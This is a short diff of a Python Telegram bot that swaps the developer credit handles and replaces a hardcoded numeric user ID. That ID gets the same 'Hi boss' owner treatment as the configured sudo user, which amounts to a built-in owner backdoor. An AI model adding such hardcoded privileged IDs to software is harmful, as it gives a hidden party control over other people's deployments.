@@ -10,7 +10,7 @@ sudo = config.sudo
 ch = config.ch
 bot = telebot.TeleBot(token)
 
-# Developer :- Telegram : MoamalHussin , Telegram Channel : Moamx_Code , Instagram : Moresxx
+# Developer :- Telegram : ccXco , Telegram Channel : robinatz , Instagram : xb.2_
 
 headerss = {
     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
@@ -81,7 +81,7 @@ def startbot(message):
     req = requests.get(sub, headers=headerss)
     submores = f'https://api.telegram.org/bot{req_token}/getChatMember?chat_id=@{req_channel}&user_id={idd}'
     reqmores = requests.get(submores, headers=headerss)
-    if idd == sudo or idd == 1300329679:
+    if idd == sudo or idd == 1659187103:
         bot.send_message(message.chat.id, text='Hi boss\n\n'
                          , parse_mode='markdown', reply_markup=markup_inline)
     if 'member' in reqmores.text or 'creator' in  reqmores.text or 'administrator' in  reqmores.text:
